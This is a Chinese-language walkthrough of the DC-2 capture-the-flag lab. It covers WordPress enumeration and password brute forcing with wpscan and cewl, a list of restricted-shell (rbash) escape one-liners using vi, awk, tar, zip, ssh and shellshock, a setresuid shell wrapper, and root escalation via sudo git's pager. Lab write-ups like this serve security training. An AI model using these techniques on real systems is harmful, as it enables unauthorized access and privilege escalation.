# 寻找靶机IP并探测端口

第一步与DC-1靶场是一样的

sudo arp-scan -l

找到靶机IP：192.168.152.130

探测靶机开放端口：

nmap -sV -p- 192.168.152.130

发现开放了80端口和7744端口

# 信息搜集

我们尝试直接访问这个IP地址，发现页面会显示无法访问，且输入的IP变成了dc-2/

这是后我们需要更改/etc/hosts文件添加一个IP域名指向：

vim /etc/hosts

如果我们想在Windows物理机上面实现成功访问的话还需要修改这个文件的文件内容：

C:\Windows\System32\drivers\etc\hosts

在文件末尾添加相同的192.168.152.130 dc-2，保存之后就可以成功访问了

通过Wappalyzer可以发现这是一个包含Wordpress（CMS）搭建起来的站点，并且有一个flag选项：

Flag 1:
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.

这里提示我们需要用cewl来生成字典，字典越大越好，然后用一个身份登录进去之后拿到下一个flag

但除了生成字典之外，我们还没有发现哪里有登录界面，所以需要进行dirsearch目录扫描

dirsearch -u "http://192.168.152.130"

通过wpscan我们可以实现用户枚举：

wpscan --url http://dc-2 --enumerate u

wpscan：kali Linux自带的漏洞扫描工具，采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordpPress本身的漏洞，最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress，它不仅可以扫描类似robots.txt这样的敏感文件，而且能够检测当前已启用的插件和其他功能，该扫描器可以实现获取站点用户名，获取安装的所有插件、主题以及存在漏洞的插件、主题，并提供漏洞信息，同时还可以实现对未加防护的WordPress站点暴力破解用户名密码

我们需要通过cewl爬取网站关键信息获取密码字典（-w表示写入文件的名称）：

cewl http://dc-2/index.php/flag/ -w dict.txt

通过用户枚举可以得到admin、jerry、tom三个用户，接下来我们把他们写入users.txt然后爆破密码：

vim users.txt
wpscan --url http://dc-2/ -U users.txt -P dict.txt

我们发现成功拿到了jerry和tom用户的密码，接下来我们尝试登录（通过dirsearch发现有wp-login.php，猜测是登录界面）

成功登录并在page里面发现了flag2

# 绕过Restricted shell

Resrticted shell：即受限的shell，与一般的标准shell区别在于会限制执行一些行为，比如：用cd来改变路径，设置或取消SHELL，ENV或BASH_ENV变量的值，指定的命令名中包含/

最常见的实现是Bash的受限模式rbash，当Bash以这个名称启动的时候，或者使用了-r / --restricted选项时，就会进入受限模式，该模式在启动文件读取完毕时开始生效，并施加一系列关键限制：

  • 禁止改变目录：不能使用cd内建命令
  • 禁止修改关键环境变量：不能设置或取消SHELL，PATH，HISTFILE，ENV或BASH_ENV的值
  • 禁止使用包含斜杠/的命令或路径：这意味着无法通过完整路径/bin/sh来执行命令
  • 禁止输出重定向：不能使用>，>>，>|，<>，>&，&>等操作将输出写入文件
  • 禁止替换shell：不能使用exec内建命令来启动另一个程序替换当前shell
  • 禁止禁用或启用内建命令：限制了enable命令的相关选项，防止开启被禁用的功能
  • 禁止关闭受限模式：不能通过set +r或者shopt -u restricted_shell来关闭限制

这些限制的核心逻辑是控制可执行命令的范围（通过限制PATH）和防止对文件系统的意外写入（通过禁止重定向和cd）

# 枚举Linux环境

首先是对环境进行一次探测，也就是信息搜集：

  • 检查可用命令：如cd、ls、echo等

  • 检查可用的操作符：>、>>、<、|等

    # echo A;echo B
A
B

# echo A && echo B
A
B

# false || echo 1
1

# echo `echo ZLARYY`
ZLARYY

# echo $(echo ZLARYY)
ZLARYY

# (echo ZLARYY)
ZLARYY

# echo 1 | while read line;do echo "$line";done
1

  • root身份运行哪些命令：sudo -l（部分rbash情况下用不了）

  • 检查shell：echo $SHELL，基本上都是/bin/rbash

  • 编程语言：检查可用的编程语言，如python、perl、ruby等

    # python
-rbash: python: command not found

# perl
-rbash: perl: command not found

# ruby
-rbash: ruby: command not found

  • 检查环境变量：执行env或者printenv：

    # printenv
-rbash: printenv: command not found

# env
-rbash: env: command not found

# 常见利用技术

# /字符被允许

如果/被允许我们可以直接运行/bin/bash或者/bin/sh，不过在该靶场里面我们会看到-rbash: /bin/bash: restricted: cannot specify `/' in command names

# cp命令被允许

如果cp命令被允许我们可以直接复制/bin/bash到本目录用户：

cp /bin/bash kbash
./kbash

cp /bin/sh ksh
./ksh

# 探测应用

# FTP
ftp > !/bin/sh

# GDB
gdb > !/bin/sh

# man/git
man > !/bin/sh
git > git help status

# vim / vi
!/bin/sh
!/bin/bash

# more/less
!'sh'

ftp表示启动FTP客户端，进入交互式命令界面ftp>，然后输入!/bin/sh，其含义可拆分为：

  • ftp>：FTP客户端的交互式提示符，不需要手动输入
  • !：在支持该功能的FTP客户端中，调用本地系统Shell执行命令
  • /bin/sh：Linux系统中的Shell解释器

因此实际作用是尝试从FTP客户端启动本地/bin/sh，这里的/bin/sh是当前机器上的shell而不是远程FTP服务器上的shell

其原理是部分FTP客户端支持通过!调用外部shell，rbash限制的是它自己解析和执行的命令，而某些被允许启动的程序仍可能具有执行其他程序的能力

不过在DC-2靶场中很明显，无法通过ftp、gdb、man/git、vim进入交互界面：

-rbash: ftp: command not found
-rbash: gdb: command not found
-rbash: /bin/sh: restricted: cannot redirect output
-rbash: git: restricted: cannot redirect output
-rbash: vim: command not found
-rbash: more: command not found

但是可以用vi：

vi
:set shell=/bin/sh
:shell

接下来按回车就会进入新的命令行了

不过似乎还是有点限制，需要我们更改PATH或SHELL环境变量

# 查看
export -p

这里需要我们修改PATH为/usr/sbin:/usr/bin:/rbin:/bin：

export PATH="/usr/sbin:/usr/bin:/rbin:/bin"

其中：

  • /usr/sbin：系统管理命令工具
  • /usr/bin：常用用户命令
  • /sbin：系统管理工具
  • /bin：基础命令工具

在Restricted shell中，无法使用cat很可能不是因为cat命令被删除，而是PATH被可刻意限制，导致shell找不到cat程序，修改PATH为如上值之后，相当于让shell以后执行外部命令时可以到这四个目录中查找

# set shell

在一些编辑器或命令中可以设置shell变量然后执行，比如刚才在vi中执行的：

:set shell=/bin/sh
:shell

也可以在vim中执行

# 更改PATH或SHELL环境变量

用export -p查看

这里我们发现PATH和SHELL变量都是-rx，这意味着我们只能执行而不能写入，如果可写就可以直接写入/bin/bash，或者将PATH修改为上述PATH="/usr/sbin:/usr/bin:/rbin:/bin"

php -a then exec("sh -i");

# lua
os.execute('/bin/sh').

# 最新技术

# ssh
ssh username@IP - t "/bin/sh" or "/bin/bash"

# ssh2
ssh username@IP -t "bash --noprofile"

# ssh
ssh username@IP -t "() { :; }; /bin/bash" (shellshock)

# ssh4
ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)

# ZIP
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"

# tar
tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash

# awk
awk 'BEGIN {system("/bin/bash")}'

# pico
pico -s "/bin/bash"
然后输入/bin/bash按CTRL + T

# scp
## scp -S program：指定加密传输时所用程序
## spellbash.sh脚本功能在于给shell加权限执行
scp -S ./spellbash.sh 127.0.0.1:/tmp/z.zip ./
# spellbash.sh代码如下

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
int main(int argc, char **argv, char **envp)
{
    setresgid(getegid(), getegid(), getegid());
    setresuid(geteuid(), geteuid(), geteuid());

    execve("/bin/bash", argv,  envp);
    return 0;
}

# git提权

Git提权是指攻击者利用Git的某些功能，结合Linux系统中不安全的权限配置，讲普通用户权限提升为更高权限

Git本身是版本控制工具，但它还有调用外部程序的能力：

  • 使用less分页显示内容
  • 调用编辑器修改提交信息
  • 使用Git Hooks执行脚本
  • 调用外部命令完成Git操作

如果系统允许普通用户通过sudo以root身份运行Git，就可以通过这些功能简介执行高权限命令

# 检查sudo权限

sudo -l

看到返回：

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

说明用户jerry可以不输入密码，以root身份执行/usr/bin/git

# 利用Git的分页器

sudo git -p help config

-p表示启用分页显示，help config表示查看Git配置帮助，在相应环境中，这可能启动Git配置帮助

其原理为Git的help命令特性：Git的help子命令会调用less或vi等文本查看器显示帮助文档，通过在这些编辑器中触发shell执行命令（如!command）可以绕过权限控制，直接以root身份执行命令
